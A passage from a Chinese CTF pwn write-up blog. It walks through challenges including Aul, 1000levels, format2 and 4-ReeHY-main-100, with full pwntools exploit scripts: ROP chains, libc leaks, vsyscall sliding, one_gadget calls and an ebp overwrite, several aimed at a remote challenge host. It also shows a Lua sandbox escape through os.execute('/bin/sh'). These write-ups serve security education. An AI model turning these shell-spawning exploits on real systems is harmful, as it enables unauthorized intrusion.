payload+=p64(main_addr)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input your name pls: &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    pass_canary(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    libc_start_main_addr = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    libc_addr_base=libc_start_main_addr-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">&quot;libc_start_main_addr &quot;</span>+<span class="built_in">hex</span>(libc_start_main_addr))</span><br><span class="line">    log.success(<span class="string">&quot;libc_addr_base &quot;</span>+<span class="built_in">hex</span>(libc_addr_base))</span><br><span class="line"></span><br><span class="line">    system_addr=libc_addr_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr=libc_addr_base+libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">    payload=<span class="string">&quot;\x00&quot;</span>*<span class="number">0x110</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(rdi_ret)</span><br><span class="line">    payload+=p64(bin_sh_addr)</span><br><span class="line">    payload+=p64(system_addr)</span><br><span class="line">    payload+=p64(main_addr)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input your name pls: &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    pass_canary(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br></pre></td></tr></table></figure>

<p>最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223111914992.png" alt="image-20201223111914992"></p>
<h3 id="23-Aul"><a href="#23-Aul" class="headerlink" title="23. Aul"></a>23. Aul</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109160338252.png" alt="image-20210109160338252"></p>
<p>题目没有附件，使用nc连接后，发现是一个游戏程序，随便输入发现提示输入help获得更多信息。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109160637417.png" alt="image-20210109160637417"></p>
<p>输入help后发现是一个lua编写的程序。</p>
<p><strong><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109160729589.png" alt="image-20210109160729589"></strong></p>
<p>通过查询反编译的方式，在补足字节码头部后得到反编译得到源码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line">function make_board(size)</span><br><span class="line">   local board &#x3D; &#123; size &#x3D; size &#125;</span><br><span class="line">   setmetatable(board, &#123; __tostring &#x3D; board_tostring &#125;)</span><br><span class="line"></span><br><span class="line">   for n &#x3D; 0, size * size - 1 do</span><br><span class="line">      board[n] &#x3D; 0</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   return board</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function populate_board(board, filled, seed)</span><br><span class="line">   local size &#x3D; board.size</span><br><span class="line">   if seed then math.randomseed(seed) end</span><br><span class="line">   filled &#x3D; filled or size * size * 3 &#x2F; 4</span><br><span class="line"></span><br><span class="line">   local function rand()</span><br><span class="line">      local c</span><br><span class="line">      repeat c &#x3D; math.random(size * size) - 1 until board[c] &#x3D;&#x3D; 0</span><br><span class="line">      return c</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   if filled &gt; 0 then</span><br><span class="line">      for _,v in ipairs&#123;&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;&#125; do board[rand()] &#x3D; v end</span><br><span class="line"></span><br><span class="line">      for n &#x3D; 1, filled-4 do</span><br><span class="line">         board[rand()] &#x3D; math.random(4)</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">      return fall(board)</span><br><span class="line">   end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function board_tostring(board)</span><br><span class="line">   local lines &#x3D; &#123;&#125;</span><br><span class="line">   local size &#x3D; board.size</span><br><span class="line">   for y &#x3D; 0, size - 1 do</span><br><span class="line">      local line &#x3D; &quot;|&quot;</span><br><span class="line">      for x &#x3D; 0, size - 1 do</span><br><span class="line">         line &#x3D; line .. &quot; &quot; .. board[x+y*size]</span><br><span class="line">      end</span><br><span class="line">      table.insert(lines, line .. &quot; |&quot;)</span><br><span class="line">   end</span><br><span class="line">   return table.concat(lines,&quot;\n&quot;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function fall(board)</span><br><span class="line">   local size &#x3D; board.size</span><br><span class="line">   local new_board &#x3D; make_board(size, 0)</span><br><span class="line"></span><br><span class="line">   local function fall_column(col)</span><br><span class="line">      local dest &#x3D; size - 1</span><br><span class="line">      for y &#x3D; size-1, 0, -1 do</span><br><span class="line">         if board[y*size + col] ~&#x3D; 0 then</span><br><span class="line">            new_board[dest*size + col] &#x3D; board[y*size + col]</span><br><span class="line">            dest &#x3D; dest - 1</span><br><span class="line">         end</span><br><span class="line">      end</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   for x&#x3D;0, size-1 do</span><br><span class="line">      fall_column(x)</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   return new_board</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function rotate(board)</span><br><span class="line">   local size &#x3D; board.size</span><br><span class="line">   local new_board &#x3D; make_board(size, 0)</span><br><span class="line"></span><br><span class="line">   for y &#x3D; 0, size-1 do</span><br><span class="line">      local dest_col &#x3D; size - 1 - y</span><br><span class="line"></span><br><span class="line">      for n &#x3D; 0, size-1 do</span><br><span class="line">         new_board[n*size + dest_col] &#x3D; board[y*size + n]</span><br><span class="line">      end</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   return new_board</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function crush(board)</span><br><span class="line">   local size &#x3D; board.size</span><br><span class="line">   local new_board &#x3D; make_board(size, 0)</span><br><span class="line">   local crushers &#x3D; &#123;&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;&#125;</span><br><span class="line"></span><br><span class="line">   for n&#x3D;0, size-1 do</span><br><span class="line">      new_board[n] &#x3D; board[n]</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   for n &#x3D; size, size*size - 1 do</span><br><span class="line">      if board[n-size] &#x3D;&#x3D; crushers[board[n]] then</span><br><span class="line">         new_board[n] &#x3D; 0</span><br><span class="line">      else</span><br><span class="line">         new_board[n] &#x3D; board[n]</span><br><span class="line">      end</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   return new_board</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function rotate_left(board)</span><br><span class="line">   return rotate(rotate(rotate(board)))</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function readAll(file)</span><br><span class="line">    local f &#x3D; io.open(file, &quot;rb&quot;)</span><br><span class="line">    local content &#x3D; f:read(&quot;*all&quot;)</span><br><span class="line">    f:close()</span><br><span class="line">    return content</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function help()</span><br><span class="line">	local l &#x3D; string.sub(readAll(&quot;server.luac&quot;), 2)</span><br><span class="line"></span><br><span class="line">	writeraw(l, string.len(l))</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">quit &#x3D; false</span><br><span class="line">function exit()</span><br><span class="line">	quit &#x3D; true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function run_step(board)</span><br><span class="line">   local cmd &#x3D; readline()</span><br><span class="line"></span><br><span class="line">   if(string.len(cmd) &#x3D;&#x3D; 0) then</span><br><span class="line">   	 exit()</span><br><span class="line">   	 return nil</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   -- prevent injection attacks</span><br><span class="line">   if(string.find(cmd, &quot;function&quot;)) then</span><br><span class="line">   	 return nil</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   if(string.find(cmd, &quot;print&quot;)) then</span><br><span class="line">   	 return nil</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   local f &#x3D; load(&quot;return &quot; .. cmd)()</span><br><span class="line"></span><br><span class="line">   if f &#x3D;&#x3D; nil then</span><br><span class="line">   	 return nil</span><br><span class="line">   end</span><br><span class="line"></span><br><span class="line">   return f(board)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function game()</span><br><span class="line">   local board &#x3D; populate_board(make_board(8))</span><br><span class="line"></span><br><span class="line">   repeat</span><br><span class="line">      </span><br><span class="line">      writeline(board_tostring(board) .. &quot;\n&quot;)</span><br><span class="line">      </span><br><span class="line">      local b &#x3D; run_step(board)</span><br><span class="line"></span><br><span class="line">      if quit then</span><br><span class="line">      	break</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">      if b ~&#x3D; nil then</span><br><span class="line">      	 board &#x3D; b</span><br><span class="line">         board &#x3D; fall(crush(fall(board)))</span><br><span class="line">      else</span><br><span class="line">         writeline(&quot;Didn&#39;t understand. Type &#39;rotate&#39;, &#39;rotate_left&#39;, &#39;exit&#39;, or &#39;help&#39;.\n&quot;)</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">   until false</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">writeline(&quot;let&#39;s play a game\n&quot;)</span><br><span class="line"></span><br><span class="line">game()</span><br></pre></td></tr></table></figure>

<p>一个 lua 逃逸，挺直白的，直接输入<code>os.execute(&quot;/bin/sh&quot;)</code>提权</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109161629435.png" alt="image-20210109161629435"></p>
<h3 id="24-1000levevls"><a href="#24-1000levevls" class="headerlink" title="24. 1000levevls"></a>24. 1000levevls</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228212021372.png" alt="image-20201228212021372"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228212100952.png" alt="image-20201228212100952"></p>
<h4 id="代码分析-19"><a href="#代码分析-19" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228212129503.png" alt="image-20201228212129503"></p>
<p>找到一个栈溢出，但是因为开启了PIE，所以覆盖返回地址不可行，因为不能确定具体的地址，但是可以用vsyscall滑栈的方法。</p>
<p>接下开就是思考如何调用system。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228214540803.png" alt="image-20201228214540803"></p>
<p>然后发现程序中有用到system，考虑是否可以利用。查看一下汇编，发现一个有趣的点，system地址入栈是在判断f之前的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228214648552.png" alt="image-20201228214648552"></p>
<p>同时查看主函数的调用关系，发现go函数和hint函数是公用一个栈的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228214824523.png" alt="image-20201228214824523"></p>
<p>同时还可以在go函数中看到，如果开始输入的是小于等于0的，那么v5不会初始化，也就是说如果先执行hint，然后输入v2小于等于0，那么v5就是system的地址，同时我们还有再一次输入的机会，并且这次输入将写入v6（v5+v3），也就是我们可以以system地址为基准，通过偏移得到任意的libc函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228220305556.png" alt="image-20201228220305556"></p>
<h4 id="思路及利用-18"><a href="#思路及利用-18" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>前面提到，控制程序执行只能通过滑栈的方式，也就是意味着很难有输入参数，因此自然想到将system地址改为onegadget地址，然后滑栈执行。</p>
<p>接下来就是找到one_gadget与system的偏移和滑栈的偏移。而溢出函数ans如图所示，go的rsp就是ans的rbp。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228221651239.png" alt="image-20201228221651239"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228222925316.png" alt="image-20201228222925316"></p>
<p>因此进入ans后栈的情况为：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228224934094.png" alt="image-20201228224934094">所以需要有3个vsyscall滑栈到go_rbp-0x110.</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./100levels&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">41349</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">vsyscall_addr = <span class="number">0xffffffffff600000</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;levels?&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&#x27;</span>,<span class="built_in">str</span>(one_gadget-system_offset))</span><br><span class="line"><span class="comment">#需要先回答对99个问题，最后第100个进行溢出</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">    v9 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; &quot;</span>)[:<span class="number">-1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">&quot;* &quot;</span>)</span><br><span class="line">    v10 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; &quot;</span>)[:<span class="number">-1</span>])</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Answer:&quot;</span>, <span class="built_in">str</span>(v9 * v10))</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x30</span>+<span class="number">8</span>)+p64(vsyscall_addr) *<span class="number">3</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Answer:&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="25-format2"><a href="#25-format2" class="headerlink" title="25. format2"></a>25. format2</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230182624714.png" alt="image-20201230182624714"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230182747036.png" alt="image-20201230182747036"></p>
<h4 id="代码分析-20"><a href="#代码分析-20" class="headerlink" title="代码分析"></a>代码分析</h4><p>存在后门函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230183308602.png" alt="image-20201230183308602"></p>
<p>而整个程序的流程是将我们输入的字符串进行BASE64解密后，再调用auth函数验证，成功就执行shell。</p>
<p>auth存在一个栈溢出漏洞。v4是int类型有八个字节，而我们的输入最多到12个字节，也就是说我们可以覆盖到ebp。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230183424923.png" alt="image-20201230183424923"></p>
<h4 id="思路及利用-19"><a href="#思路及利用-19" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>上述分析可知，我们现在可以覆盖auth函数的ebp。</p>
<p>假设我们修改了ebp的内容为xxxx，且这个xxxx能被正常访问，那么auth函数执行完成后，回到main函数的ebp就指向了xxxx。</p>
<p>当main函数结束时，执行leave，retn指令。相当于：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp </span><br><span class="line">pop ebp <span class="comment">//ebp = &amp;xxxx</span></span><br><span class="line">pop rip <span class="comment">//rip = &amp;(xxxx)+4</span></span><br></pre></td></tr></table></figure>

<p>也就是说，如果输入的input为aaaabbbbcccc，将cccc置为input的地址，那么就可以执行bbbb指向的内容。</p>
<p>此，我们把bbbb改成我们的getshell的地址,把cccc改成input_addr，那么我们就能get shell。</p>
<p>接下来就是确定getshell盒4和input的地址。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230185552349.png" alt="image-20201230185552349"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230185625780.png" alt="image-20201230185625780"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line">  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line">p = process(<span class="string">&#x27;./format2&#x27;</span>)  </span><br><span class="line"><span class="comment">#p = remote(&#x27;220.249.52.134&#x27;,31403)  </span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./format2&#x27;</span>)  </span><br><span class="line">input_addr = <span class="number">0x811eb40</span></span><br><span class="line">getshell_addr = <span class="number">0x8049284</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Authenticate :&#x27;</span>)  </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(getshell_addr) + p32(input_addr)  </span><br><span class="line">p.sendline(base64.b64encode(payload))  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230185951134.png" alt="image-20201230185951134"></p>
<h3 id="26-4-ReeHY-main-100"><a href="#26-4-ReeHY-main-100" class="headerlink" title="26. 4-ReeHY-main-100"></a>26. 4-ReeHY-main-100</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109161724396.png" alt="image-20210109161724396"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109161752268.png" alt="image-20210109161752268"></p>
<h4 id="代码分析-21"><a href="#代码分析-21" class="headerlink" title="代码分析"></a>代码分析</h4><p>首先这是一道堆的菜单题，但是发现由很多漏洞。</p>
<p>首先add函数，size是有符号的，但调用输入函数是传入的参数是无符号的。所以存在整数溢出从而导致了栈溢出。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109163245339.png" alt="image-20210109163245339"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109163423023.png" alt="image-20210109163423023"></p>
<p>删除函数中存在UAF漏洞</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109163540327.png" alt="image-20210109163540327"></p>
<h4 id="思路及利用-20"><a href="#思路及利用-20" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>这道题目既可以用整数溢出后的栈溢出，也可以用unlink。</p>
<p>这里记录栈溢出的方式，在size时输入-1，那么输出buf时就可以溢出，然后就是基础的栈溢出漏洞利用，先泄露地址再获得shell。</p>
<p>编写exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./4-ReeHY-main&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">51050</span>)</span><br><span class="line">a = ELF(<span class="string">&#x27;./4-ReeHY-main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./ctflibc.so.6&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,index,string</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;peanuts&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input size\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input cun\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input content\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(string))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delte</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Chose one to dele\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,string</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Chose one to edit\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the content\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(string))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0400da3</span> </span><br><span class="line">pop_rsi_r15 = <span class="number">0x400da1</span></span><br><span class="line">put_got = <span class="number">0x602020</span></span><br><span class="line">put_plt = <span class="number">0x4006D0</span></span><br><span class="line">create(<span class="number">-1</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">128</span>+p64(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(put_got)+p64(put_plt)+p64(<span class="number">0x0400C8C</span>))</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">libc_addr = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">create(<span class="number">-1</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">128</span>+p64(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x45216</span>+libc_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109164650267.png" alt="image-20210109164650267"></p>
<h2 id="六分题"><a href="#六分题" class="headerlink" title="六分题"></a>六分题</h2><h3 id="27-echo-back"><a href="#27-echo-back" class="headerlink" title="27. echo_back"></a>27. echo_back</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109162414667.png" alt="image-20210109162414667"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109164711467.png" alt="image-20210109164711467"></p>
<h4 id="代码分析-22"><a href="#代码分析-22" class="headerlink" title="代码分析"></a>代码分析</h4><p>存在格式化字符串漏洞，但是格式化字符串长度有限制。因此格式化字符串就做不到任意地址写了。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109165943354.png" alt="image-20210109165943354"></p>
